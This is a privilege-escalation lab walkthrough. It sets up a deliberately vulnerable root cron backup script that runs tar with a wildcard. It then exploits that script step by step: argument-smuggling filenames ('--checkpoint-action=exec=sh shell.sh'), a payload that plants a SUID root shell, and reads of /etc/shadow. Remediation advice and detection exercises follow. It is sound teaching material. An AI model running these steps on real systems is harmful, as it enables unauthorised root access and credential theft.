# LAB: Shared Backup Directory → Tar Wildcard Injection → Root

**Real-World Privilege Escalation**

---

## Scenario: Corporate Backup System

You are a penetration tester who has gained initial access to a Linux server as a low-privilege user (`developer`). Your goal is to escalate to root.

**Background:**
The IT department has implemented a "self-service backup" system. Users can drop files into a shared directory, and a scheduled job automatically archives them. This is documented in the company wiki as a convenience feature.

**Your access:**
- SSH access as `developer` (a standard user account)
- No sudo privileges
- No kernel exploits available
- No SUID binaries to exploit

**Your mission:**
Escalate from `developer` to `root` using only the access you have.

---

## Learning Objectives

By the end of this lab, you will be able to:

1. Enumerate scheduled tasks and identify trust boundaries
2. Recognize dangerous wildcard usage in privileged scripts
3. Exploit tar checkpoint arguments via filename injection
4. Achieve root access from an unprivileged user
5. Articulate the exact configuration failure that enabled the attack

---

## PHASE 0 — Environment Setup (Instructor Only)

### Create the developer user

```bash
# Create low-privilege user
useradd -m -s /bin/bash developer
echo "developer:developer123" | chpasswd
```

### Create the "self-service backup" infrastructure

This simulates what an IT department might deploy:

```bash
# Create shared backup directory (world-writable so users can contribute)
mkdir -p /var/backups/shared
chmod 1777 /var/backups/shared

# Create the backup script (owned by root)
cat > /usr/local/bin/backup-shared.sh << 'EOF'
#!/bin/bash
# Nightly backup of user-contributed files
# Deployed by IT Operations - Do not modify
# Ticket: ITOPS-4521

BACKUP_DIR="/var/backups/shared"
ARCHIVE="/var/backups/shared_$(date +%Y%m%d_%H%M%S).tgz"

cd "$BACKUP_DIR"
tar czf "$ARCHIVE" *

# Rotate old backups (keep last 7)
ls -t /var/backups/shared_*.tgz 2>/dev/null | tail -n +8 | xargs -r rm
EOF

chmod 755 /usr/local/bin/backup-shared.sh
chown root:root /usr/local/bin/backup-shared.sh

# Schedule it to run every 5 minutes (simulates nightly in lab setting)
echo "*/5 * * * * root /usr/local/bin/backup-shared.sh" > /etc/cron.d/shared-backup
chmod 644 /etc/cron.d/shared-backup
```

### Add some legitimate files (to make it look real)

```bash
echo "Project notes for Q4" > /var/backups/shared/notes.txt
echo "config_backup=true" > /var/backups/shared/settings.conf
chown developer:developer /var/backups/shared/notes.txt
chown developer:developer /var/backups/shared/settings.conf
```

**Setup complete.** The environment now mimics a real corporate server.

---

## PHASE 1 — Initial Access & Reconnaissance

### Log in as the attacker (developer)

```bash
su - developer
```

### Verify your (lack of) privileges

```bash
id
```

**Expected:**
```
uid=1001(developer) gid=1001(developer) groups=1001(developer)
```

```bash
sudo -l
```

**Expected:**
```
Sorry, user developer may not run sudo on this host.
```

✅ You are an unprivileged user with no sudo access.

---

## PHASE 2 — Enumeration

### Pedagogical purpose
> Real attackers spend most of their time enumerating, not exploiting.

### Check for world-writable directories

```bash
find / -type d -perm -0002 -not -path "/proc/*" -not -path "/sys/*" 2>/dev/null | head -20
```

**Interesting finding:**
```
/var/backups/shared
```

### Investigate the shared directory

```bash
ls -la /var/backups/shared/
```

**Output:**
```
drwxrwxrwt  2 root      root      4096 ... .
drwxr-xr-x  3 root      root      4096 ... ..
-rw-r--r--  1 developer developer   21 ... notes.txt
-rw-r--r--  1 developer developer   19 ... settings.conf
```

**Observations:**
- Directory is world-writable (`rwxrwxrwt`)
- Sticky bit set (the `t`) — users can only delete their own files
- Contains user files — this is a drop zone

### Look for scheduled tasks that process this directory

```bash
cat /etc/cron.d/*
```

**Found:**
```
*/5 * * * * root /usr/local/bin/backup-shared.sh
```

**Critical finding:** Root runs a backup script every 5 minutes.

### Examine the backup script

```bash
cat /usr/local/bin/backup-shared.sh
```

**Contents:**
```bash
#!/bin/bash
BACKUP_DIR="/var/backups/shared"
ARCHIVE="/var/backups/shared_$(date +%Y%m%d_%H%M%S).tgz"

cd "$BACKUP_DIR"
tar czf "$ARCHIVE" *
...
```

### Identify the vulnerability

| Element | Value |
|---------|-------|
| Script runs as | `root` |
| Script processes | `/var/backups/shared` |
| Directory writable by | Everyone |
| Wildcard used | `tar czf "$ARCHIVE" *` |

**The vulnerability:** Root executes `tar *` in a directory you control.

---

## 🔴 STOP AND THINK

**Ask yourself:**

1. Can I modify the script? → No (owned by root, mode 755)
2. Can I modify what the script processes? → **Yes** (world-writable directory)
3. Does the script use wildcards? → **Yes** (`tar ... *`)
4. Can tar arguments be injected via filenames? → **Yes**

**This is a tar wildcard injection vulnerability.**

---

## PHASE 3 — Understanding the Attack

### How tar wildcard injection works

The `tar` command supports checkpoint actions:

```
--checkpoint=N              Display progress message every N records
--checkpoint-action=exec=CMD  Execute CMD at each checkpoint
```

When bash expands `tar czf archive.tgz *`, filenames become arguments.

If you create a file named `--checkpoint=1`, it becomes a tar flag.

### What happens normally

```bash
# Directory contains: notes.txt settings.conf
tar czf archive.tgz *
# Expands to: tar czf archive.tgz notes.txt settings.conf
```

### What happens with injection

```bash
# Directory contains: notes.txt --checkpoint=1 --checkpoint-action=exec=sh shell.sh shell.sh
tar czf archive.tgz *
# Expands to: tar czf archive.tgz notes.txt --checkpoint=1 --checkpoint-action=exec=sh shell.sh shell.sh
```

Tar interprets the filenames as command-line options and **executes shell.sh**.

---

## PHASE 4 — Exploitation

### Create the payload script

This script will be executed by root when tar runs:

```bash
cat > /var/backups/shared/shell.sh << 'EOF'
#!/bin/bash
# Create SUID root shell
cp /bin/bash /tmp/rootbash
chmod 4755 /tmp/rootbash
# Leave evidence for verification
echo "Pwned at $(date)" > /tmp/pwned.txt
chmod 644 /tmp/pwned.txt
EOF
```

Make it executable:

```bash
chmod +x /var/backups/shared/shell.sh
```

### Create the tar argument injection files

```bash
touch '/var/backups/shared/--checkpoint=1'
touch '/var/backups/shared/--checkpoint-action=exec=sh shell.sh'
```

### Verify your payload is staged

```bash
ls -la /var/backups/shared/
```

**Expected:**
```
-rw-rw-r-- 1 developer developer    0 ... --checkpoint-action=exec=sh shell.sh
-rw-rw-r-- 1 developer developer    0 ... --checkpoint=1
-rw-r--r-- 1 developer developer   21 ... notes.txt
-rw-r--r-- 1 developer developer   19 ... settings.conf
-rwxrwxr-x 1 developer developer  156 ... shell.sh
```

### What will happen when cron runs

The backup script executes:
```bash
cd /var/backups/shared
tar czf /var/backups/shared_20240115_030000.tgz *
```

Bash expands `*` to:
```bash
tar czf /var/backups/shared_20240115_030000.tgz --checkpoint=1 --checkpoint-action=exec=sh shell.sh notes.txt settings.conf shell.sh
```

Tar interprets `--checkpoint=1` and `--checkpoint-action=exec=sh shell.sh` as flags and executes `shell.sh` as root.

---

## PHASE 5 — Wait for Execution (or Trigger Manually)

### Option A: Wait for cron

The job runs every 5 minutes. Wait and monitor:

```bash
watch -n 10 'ls -la /tmp/rootbash /tmp/pwned.txt 2>/dev/null'
```

### Option B: Instructor triggers manually (for class)

```bash
# Run as root to simulate cron
sudo /usr/local/bin/backup-shared.sh
```

### Verify the payload executed

```bash
ls -la /tmp/rootbash
```

**Expected:**
```
-rwsr-xr-x 1 root root 1234567 ... /tmp/rootbash
```

The `s` in `-rwsr-xr-x` indicates the SUID bit — this binary runs with root's effective UID.

```bash
cat /tmp/pwned.txt
```

**Expected:**
```
Pwned at [timestamp]
```

---

## PHASE 6 — Privilege Escalation Complete

### Execute the SUID shell

```bash
/tmp/rootbash -p
```

The `-p` flag tells bash to preserve the effective UID (required for SUID shells).

### Verify root access

```bash
id
```

**Expected:**
```
uid=1001(developer) gid=1001(developer) euid=0(root) groups=1001(developer)
```

The `euid=0(root)` proves you have effective root privileges.

### Demonstrate root capabilities

```bash
whoami
```
→ `root`

```bash
cat /etc/shadow | head -3
```
→ Shows password hashes (only readable by root)

```bash
touch /root/pwned_by_developer
ls -la /root/pwned_by_developer
```
→ File created in /root (only writable by root)

### Exit the root shell

```bash
exit
```

---

## PHASE 7 — Post-Exploitation Analysis

### The attack chain

```
developer (uid=1001)
    │
    ├── Enumerated world-writable directories
    ├── Found /var/backups/shared
    ├── Discovered root cron job processing it
    ├── Identified tar wildcard in script
    │
    ▼
Created malicious filenames
    │
    ├── --checkpoint=1
    ├── --checkpoint-action=exec=sh shell.sh
    ├── shell.sh (payload)
    │
    ▼
Root cron executed tar *
    │
    ├── Wildcard expanded filenames as arguments
    ├── Tar executed shell.sh as root
    ├── shell.sh created SUID bash
    │
    ▼
root (euid=0)
```

### What failed

| Layer | Failure |
|-------|---------|
| **Design** | Privileged process operates on user-controlled directory |
| **Implementation** | Wildcard expansion in privileged context |
| **Least Privilege** | Backup runs as root instead of dedicated user |

### The one-sentence summary

> **Root executed a command that expanded user-controlled filenames as arguments.**

---

## REMEDIATION

### Fix 1: Don't use wildcards in privileged scripts

```bash
# Bad
cd /var/backups/shared
tar czf archive.tgz *

# Good
tar czf archive.tgz /var/backups/shared
```

### Fix 2: Use -- to separate options from filenames

```bash
# Prevents filenames from being interpreted as options
tar czf archive.tgz -- *
```

### Fix 3: Run backups as a non-root user

```bash
# Create dedicated backup user
useradd -r -s /usr/sbin/nologin backupuser

# Change cron to run as backupuser
*/5 * * * * backupuser /usr/local/bin/backup-shared.sh
```

### Fix 4: Restrict the shared directory

```bash
# Use a group instead of world-writable
groupadd backupusers
chown root:backupusers /var/backups/shared
chmod 1770 /var/backups/shared
```

### Fix 5: Use find with -print0 and xargs

```bash
# Safe wildcard alternative
find /var/backups/shared -maxdepth 1 -type f -print0 | xargs -0 tar czf archive.tgz
```

---

## VULNERABILITY CLASSIFICATION

| Framework | Classification |
|-----------|----------------|
| **CWE** | CWE-78: Improper Neutralization of Special Elements used in an OS Command |
| **MITRE ATT&CK** | T1053.003: Scheduled Task/Job: Cron |
| **GTFOBins** | https://gtfobins.github.io/gtfobins/tar/ |
| **OWASP** | Injection |

---

## REAL-WORLD EXAMPLES

This vulnerability pattern appears in:

1. **Backup scripts** — Exactly as demonstrated
2. **Log rotation** — Scripts that process user-writable log directories
3. **File upload processors** — Web apps that extract uploaded archives
4. **CI/CD pipelines** — Build systems that process user-submitted code
5. **Container image builds** — Dockerfiles that COPY directories with wildcards

---

## CLEANUP (Instructor)

```bash
# Remove developer user
pkill -u developer 2>/dev/null || true
userdel -r developer 2>/dev/null || true

# Remove backup infrastructure
rm -f /etc/cron.d/shared-backup
rm -f /usr/local/bin/backup-shared.sh
rm -rf /var/backups/shared
rm -f /var/backups/shared_*.tgz

# Remove exploitation artifacts
rm -f /tmp/rootbash
rm -f /tmp/pwned.txt
rm -f /root/pwned_by_developer
```

---

## STUDENT EXERCISES

### Exercise 1: Alternative Payloads

Instead of creating a SUID shell, write a payload that:
- Adds your SSH key to /root/.ssh/authorized_keys
- Creates a new root user
- Installs a reverse shell

### Exercise 2: Detection

As a defender, how would you detect this attack?
- File integrity monitoring
- Anomalous filenames in backup directories
- SUID binary creation alerts

### Exercise 3: Other Wildcards

Research and test wildcard injection in:
- `rsync`
- `chown`
- `chmod`
- `7z`

### Exercise 4: Write a Scanner

Write a bash script that scans a system for:
- World-writable directories
- Cron jobs that process those directories
- Scripts using wildcards